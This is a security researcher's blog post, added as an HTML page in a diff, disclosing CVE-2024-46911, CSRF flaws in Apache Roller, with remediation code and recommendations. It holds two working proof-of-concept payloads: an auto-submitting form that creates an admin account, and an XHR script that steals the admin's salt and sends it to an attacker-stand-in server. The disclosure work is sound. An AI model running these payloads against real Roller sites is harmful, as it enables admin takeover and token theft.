@@ -1,0 +1,911 @@
+
+
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.28.1 by Michael Rose
+  Copyright 2013-2026 Michael Rose - mademistakes.com | @mmistakes
+  Copyright 2024-2026 iBug - ibugone.com | @iBug
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js" dir="ltr">
+  <head>
+    
+<meta charset="utf-8">
+
+
+<!-- begin _includes/seo.html --><title>CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller | iam.chi</title>
+<meta name="description" content="Overview">
+
+
+  <meta name="author" content="Chi Tran">
+  
+  <meta property="article:author" content="Chi Tran">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="iam.chi">
+<meta property="og:title" content="CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller">
+<meta property="og:url" content="http://localhost:4444/research/apache-roller-csrf/">
+
+
+  <meta property="og:description" content="Overview">
+
+
+
+  <meta property="og:image" content="http://localhost:4444/images/site-preview.png">
+  
+
+
+
+  <meta name="twitter:site" content="@imspicynoodles">
+  <meta name="twitter:title" content="CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller">
+  <meta name="twitter:description" content="Overview">
+  <meta name="twitter:url" content="http://localhost:4444/research/apache-roller-csrf/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4444/images/site-preview.png">
+      
+    
+  
+
+  
+
+
+
+
+
+  <meta property="article:published_time" content="2024-10-12T00:00:00-04:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4444/research/apache-roller-csrf/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="iam.chi Feed">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+  
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- Site is dark-skin only (minimal_mistakes_skin: dark) — tell the browser so
+     native UI (form controls, scrollbars, mobile address bar) matches instead
+     of defaulting to light, and there's no light-mode flash before CSS loads. -->
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#252a34">
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    
+<nav class="skip-links" aria-label="Skip links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav" aria-label="Primary navigation">
+        
+        <a class="site-title" href="/">
+          iam.chi
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="https://ctrsec.io"
+                
+                
+              >All Posts</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+
+
+<div id="main" role="main">
+  
+
+  <div class="sidebar sticky">
+  
+
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="http://localhost:4444/">
+        <img src="/images/bio-photo.jpg" alt="Chi Tran" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="http://localhost:4444/" itemprop="url">Chi Tran</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Senior Security Researcher, dad of two, and a former line cook who never stopped loving spicy noodles. I write up the vulnerabilities and other rabbit holes I stumble into.</p>
+
+<p><em>Opinions and research here are my own — not my employer’s, past or present.</em></p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:research@ctrsec.io" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/iam-trchi/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/imspicynoodles" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/0xfatty" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="/files/Chi_Tran_Resume.pdf" rel="nofollow noopener noreferrer me"><i class="fas fa-fw fa-file-pdf" aria-hidden="true"></i><span class="label">Resume</span></a></li>
+          
+        
+          
+            <li><a href="https://ctrsec.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Homepage</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller">
+    <meta itemprop="description" content="Overview">
+    <meta itemprop="datePublished" content="2024-10-12T00:00:00-04:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="http://localhost:4444/research/apache-roller-csrf/" itemprop="url">CVE-2024-46911: Uncovering CSRF vulnerabilities in Apache Roller
+</a>
+          </h1>
+          
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-10-12T00:00:00-04:00">October 12, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc" aria-label="Table of contents">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#overview">Overview</a></li><li><a href="#vulnerability-details">Vulnerability Details</a><ul><li><a href="#first-report-payload">First-report payload</a></li><li><a href="#initial-fix-sanitizing-weblog-content-and-salt-binding">Initial Fix: Sanitizing Weblog Content and Salt Binding</a></li><li><a href="#follow-up-report-csrf-vulnerability-via-administrative-endpoint">Follow-up Report: CSRF Vulnerability via Administrative Endpoint</a></li></ul></li><li><a href="#second-report-payload">Second-report payload</a></li><li><a href="#remediation">Remediation</a></li><li><a href="#limitations">Limitations</a></li><li><a href="#future-recommendations">Future Recommendations</a></li><li><a href="#acknowledging-the-authors-effort">Acknowledging the Author’s Effort</a></li><li><a href="#contributors-welcome">Contributors Welcome</a></li><li><a href="#references">References</a></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="overview">Overview</h2>
+
+<p><a href="https://github.com/apache/roller">Apache Roller</a>, an open-source blog server platform, has long been favored for managing and publishing content on the web. However, like many web-based applications, it can be subject to vulnerabilities that pose security risks. This blog post discusses the details of the vulnerabilities recently addressed in Apache Roller and assigned <a href="https://www.openwall.com/lists/oss-security/2024/10/12/1">CVE-2024-46911</a>. The report focuses on the security flaws, their impact, remediation steps taken, the limitations of the fixes, and future recommendations for enhancing Roller’s security posture.</p>
+
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+
+<p>During a recent research of Apache Roller, I identified a vulnerability that allows attackers to exploit a combination of <code class="language-plaintext highlighter-rouge">Input Validation Errors</code> and <code class="language-plaintext highlighter-rouge">Cross-Site Request Forgery (CSRF)</code> attacks. While the application uses the <code class="language-plaintext highlighter-rouge">HttpOnly</code> flag on cookies—preventing them from being accessed by JavaScript—the system lacks robust CSRF protection. This omission leaves the application vulnerable to unauthorized administrative actions.</p>
+
+<p>The core issue I reported is not merely about allowing users to publish arbitrary HTML or JavaScript content. While improper input validation might make it easier for attackers to craft malicious payloads, the real concern lies in the lack of CSRF protection. This enables attackers to craft malicious requests to trick an admin into executing sensitive operations without their knowledge or consent.</p>
+
+<p>An attacker could lure an authenticated administrator to visit a malicious site hosting a CSRF payload. Once the payload is triggered, actions such as modifying administrative settings or changing credentials could be performed, bypassing the need for direct interaction with the vulnerable Apache Roller weblog. This demonstrates that the lack of CSRF protection poses a security risk even in trusted environments, as the attack can be executed remotely via external websites.</p>
+
+<h3 id="first-report-payload">First-report payload</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action="http://localhost:8080/roller/roller-ui/admin/createUser.rol" method="POST"&gt;
+      &lt;input type="hidden" name="salt" value="salt_obtained_from_any_api_call_from_normal_user" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;userName" value="hacker" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;screenName" value="hacker" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;fullName" value="hacker" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;password" value="hacker" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;emailAddress" value="hacker-email&amp;#64;attacker&amp;#46;com" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;locale" value="en&amp;#95;US" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;timeZone" value="America&amp;#47;Chicago" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;enabled" value="true" /&gt;
+      &lt;input type="hidden" name="&amp;#95;&amp;#95;checkbox&amp;#95;bean&amp;#46;enabled" value="true" /&gt;
+      &lt;input type="hidden" name="bean&amp;#46;administrator" value="true" /&gt;
+      &lt;input type="hidden" name="&amp;#95;&amp;#95;checkbox&amp;#95;bean&amp;#46;administrator" value="true" /&gt;
+      &lt;input type="hidden" name="action&amp;#58;createUser&amp;#33;save" value="Save" /&gt;
+      &lt;input type="submit" value="Submit request" /&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<h3 id="initial-fix-sanitizing-weblog-content-and-salt-binding">Initial Fix: Sanitizing Weblog Content and Salt Binding</h3>
+
+<p>Following my initial report, Apache Roller addressed the vulnerability in version <code class="language-plaintext highlighter-rouge">6.1.4</code> by introducing two key measures:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Weblog Content Sanitization</code>: By default, weblog content now undergoes sanitization, preventing arbitrary HTML and JavaScript injections in user-generated content.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Salt Value Binding</code>: The system now binds the salt value—used as a security mechanism—to the authenticated admin user, preventing its reuse across different users or sessions. This ties the salt value to a single session and reduces its exposure, minimizing the potential for replay attacks.
+However, despite these improvements, a new vulnerability was uncovered that still allows attackers to compromise Site Admin privileges by stealing the salt value through an administrative endpoint.</p>
+  </li>
+</ul>
+
+<h3 id="follow-up-report-csrf-vulnerability-via-administrative-endpoint">Follow-up Report: CSRF Vulnerability via Administrative Endpoint</h3>
+
+<p>With the fix in my previous report, it is a bit more challenging since salt-value is now tied to a specific user. Then another approach is to find a way to <code class="language-plaintext highlighter-rouge">steal</code> Admin’s salt. In the follow-up to the original vulnerability, I identified a new security flaw in the Web Analytics configuration feature accessible to admin users. This vulnerability exposes a salt value to attackers who can craft malicious requests to extract sensitive data. The exploit works by leveraging the <code class="language-plaintext highlighter-rouge">XMLHttpRequest (XHR)</code> object, which can retrieve and relay the salt value without the admin’s knowledge.</p>
+
+<ul>
+  <li>Affected Component:
+Endpoint: <code class="language-plaintext highlighter-rouge">/roller/roller-ui/admin/globalConfig.rol</code> (Admin Endpoint), only accessible to admin users</li>
+</ul>
+
+<p>The Apache Roller Admin endpoint exposes a sensitive salt value embedded within an HTML hidden input field. When an admin user accesses this endpoint, the response includes a hidden form field containing the salt:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input type="hidden" name="salt" value="nHmPrUUmY6gOrmt7I4yc" id="globalConfig_salt"/&gt;&lt;h3&gt;Site Settings&lt;/h3&gt;
+</code></pre></div></div>
+
+<p>An attacker with lower privileges can exploit this flaw by tricking an admin into visiting a malicious weblog or external site controlled by the attacker. Using an <code class="language-plaintext highlighter-rouge">XMLHttpRequest (XHR)</code> object or similar mechanism, the attacker can silently make a GET request to <code class="language-plaintext highlighter-rouge">/roller/roller-ui/admin/globalConfig.rol</code>, retrieve the salt from the response, and forward it to an attacker-controlled server.</p>
+
+<p>Once the attacker has obtained the salt, they can utilize it to perform unauthorized actions, such as privilege escalation or further compromising the system by impersonating the admin in future requests.</p>
+
+<h2 id="second-report-payload">Second-report payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+var req = new XMLHttpRequest();
+
+// Make a GET request to the admin-only endpoint
+req.open('GET', 'http://localhost:8080/roller/roller-ui/admin/globalConfig.rol', true);
+req.onreadystatechange = function() {
+    if (req.readyState === 4 &amp;&amp; req.status === 200) {
+        // Parse the response to find the salt value
+        var parser = new DOMParser();
+        var doc = parser.parseFromString(req.responseText, 'text/html');
+        var saltInput = doc.querySelector('input[type="hidden"][name="salt"]');
+
+        if (saltInput) {
+            var saltValue = saltInput.getAttribute('value');
+
+            // Forward the salt value to the attacker's controlled server
+            var postReq = new XMLHttpRequest();
+            postReq.open('POST', 'http://localhost:8081/stealing-salt', true);
+            postReq.setRequestHeader('Content-Type', 'text/plain');
+            postReq.send(saltValue);
+        }
+    }
+};
+req.send();
+&lt;/script&gt;
+</code></pre></div></div>
+
+<h2 id="remediation">Remediation</h2>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">One-time-use Salt</code>: As part of the fix, one-time-use salts have been implemented. After each successful use, the salt is invalidated and removed from the cache to prevent reuse in further requests. This limits the attack window, even if an attacker manages to obtain a valid salt.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Sanitization of Weblog Content</code>: By default, HTML sanitization ensures that arbitrary HTML and JavaScript content cannot be injected into weblog posts, mitigating one vector for exploiting the vulnerability.</p>
+  </li>
+  <li>
+    <p>Example of how salts are now being handled in the updated code:</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Validate the salt value from the request
+String salt = httpReq.getParameter("salt");
+if (salt == null || !Objects.equals(saltCache.get(salt), userId)) {
+    log.debug("Invalid salt found for POST to: " + httpReq.getServletPath());
+    throw new ServletException("Security Violation: Invalid Salt");
+}
+
+// Invalidate the salt after successful use
+saltCache.remove(salt);
+log.debug("Salt used and invalidated: " + salt);
+</code></pre></div></div>
+
+<p>By invalidating the salt after its first use, this approach ensures that salts cannot be reused by attackers attempting to replay malicious requests.</p>
+
+<h2 id="limitations">Limitations</h2>
+
+<ul>
+  <li>
+    <p>Partial Fix: While the introduction of one-time-use salts significantly improves security, the exposure of the salt value still remains a critical issue. The salt, once embedded in the response, can still be intercepted through XHR or similar attacks, making it a potential risk in the future.</p>
+  </li>
+  <li>
+    <p>Trust Assumptions: The fix assumes that trusted admins will not be tricked into visiting malicious sites or unknowingly interacting with attacker-controlled resources. However, the potential for social engineering or phishing still exists.</p>
+  </li>
+</ul>
+
+<h2 id="future-recommendations">Future Recommendations</h2>
+
+<ul>
+  <li>
+    <p>Switch to Secure CSRF Tokens: Moving away from salt-based protection to using secure CSRF tokens (e.g., generated server-side and stored in HttpOnly, SameSite cookies) would provide a more robust defense. This would prevent tokens from being accessed by JavaScript and stop them from being used in CSRF attacks.</p>
+  </li>
+  <li>
+    <p>JWT-based Protection: Implement JSON Web Tokens (JWTs) for session management and request validation. JWTs are self-contained and can carry authentication data securely. They can be used to validate each request and are harder to forge when properly signed.</p>
+  </li>
+  <li>
+    <p>Expiring Salt Values: While one-time-use salts help mitigate attacks, implementing short-lifetime salts with expiration times could further limit their usefulness if intercepted.</p>
+  </li>
+</ul>
+
+<h2 id="acknowledging-the-authors-effort">Acknowledging the Author’s Effort</h2>
+
+<p>The author of Apache Roller - Dave Johnson - has been proactive in addressing the vulnerabilities identified in these reports. In response to my findings, Dave quickly implemented key security enhancements, such as the sanitization of weblog content by default and the introduction of one-time-use salt values. These improvements significantly reduce the attack surface, particularly for low-privilege users attempting to escalate their permissions.</p>
+
+<p>However, it’s also important to acknowledge the current usage landscape of Apache Roller. As the author pointed out in our previous discussions, Apache Roller today is primarily used by security researchers rather than by a broad base of end users or enterprise deployments. Given this context, implementing a completely new CSRF protection mechanism—such as JWT-based token storage or the adoption of secure CSRF tokens—might be considered overkill for the current state of the project.</p>
+
+<p>Instead, the author has opted for a balanced approach that effectively minimizes the risk of known attack vectors while maintaining the simplicity and usability of the platform. This demonstrates the author’s understanding of both the security implications and the real-world application of the software.</p>
+
+<h2 id="contributors-welcome">Contributors Welcome</h2>
+
+<p>Although the current fixes help minimize the impact of the identified vulnerabilities, Apache Roller, like all open-source projects, thrives on community involvement. If future contributors want to further enhance security or extend the platform’s capabilities, contributions are always welcome. With Apache Roller’s unique position in the open-source blogging space, there’s plenty of opportunity for those interested in advancing its security or overall functionality.</p>
+
+<p>By encouraging contributions while keeping the platform light, Apache Roller maintains an equilibrium between functionality and security—a thoughtful response to its current user base.</p>
+
+<p>Kudos to Apache Roller’s creators!</p>
+
+<h2 id="references">References</h2>
+
+<p>[1] https://github.com/apache/roller</p>
+
+<p>[2] https://www.openwall.com/lists/oss-security/2024/10/12/1</p>
+
+<p>[3] https://www.cve.org/CVERecord?id=CVE-2024-46911</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+  
+
+  
+    
+
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#research" class="page__taxonomy-item p-category" rel="tag">Research</a>
+    
+    </span>
+  </p>
+
+
+  
+
+
+        
+
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-10-12T00:00:00-04:00">October 12, 2024</time></p>
+
+
+      </footer>
+
+      
+<section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://x.com/intent/tweet?via=imspicynoodles&text=CVE-2024-46911%3A+Uncovering+CSRF+vulnerabilities+in+Apache+Roller%20http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fapache-roller-csrf%2F" class="btn btn--x" aria-label="Share on X" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on X">
+    <i class="fab fa-fw fa-x-twitter" aria-hidden="true"></i><span> X</span>
+  </a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fapache-roller-csrf%2F" class="btn btn--facebook" aria-label="Share on Facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook">
+    <i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span>
+  </a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4444/research/apache-roller-csrf/" class="btn btn--linkedin" aria-label="Share on LinkedIn" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn">
+    <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span>
+  </a>
+
+  <a href="https://bsky.app/intent/compose?text=CVE-2024-46911%3A+Uncovering+CSRF+vulnerabilities+in+Apache+Roller%20http%3A%2F%2Flocalhost%3A4444%2Fresearch%2Fapache-roller-csrf%2F" class="btn btn--bluesky" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Bluesky">
+    <i class="fab fa-fw fa-bluesky" aria-hidden="true"></i><span> Bluesky</span>
+  </a>
+</section>
+
+
+      
+
+  <nav class="pagination" aria-label="Post pagination">
+    
+      <a href="/research/pwning-the-scammer-new-zero-day/" class="pagination--pager" title="How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension">Previous</a>
+    
+    
+      <a href="/research/apache-answer-weak-uuid/" class="pagination--pager" title="CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/apache-answer-weak-uuid/" rel="permalink">CVE-2024-45719: Predictable Authorization Token Vulnerability in Apache Answer
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-11-23T00:00:00-05:00">November 23, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwning-the-scammer-new-zero-day/" rel="permalink">How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-06-24T00:00:00-04:00">June 24, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Friday night @ 9PM….
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwn2own-canon-bof-mf743cdw/" rel="permalink">[Pwn2Own 2022] CVE-2023-0855: Canon imageClass MF743CDW IPP BOF
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-05-22T00:00:00-04:00">May 22, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc p-name" itemprop="headline">
+      
+        <a class="u-url" href="/research/pwning-the-samsung-tv/" rel="permalink">Pwning the Samsung TV
+</a>
+      
+    </h2>
+    
+
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2022-01-28T00:00:00-05:00">January 28, 2022</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt p-summary" itemprop="description">Overview
+</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        
+<div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/imspicynoodles" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/0xfatty" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/iam-trchi/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2026 Chi Tran</div>
+
+
+      </footer>
+    </div>
+
+    
+
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
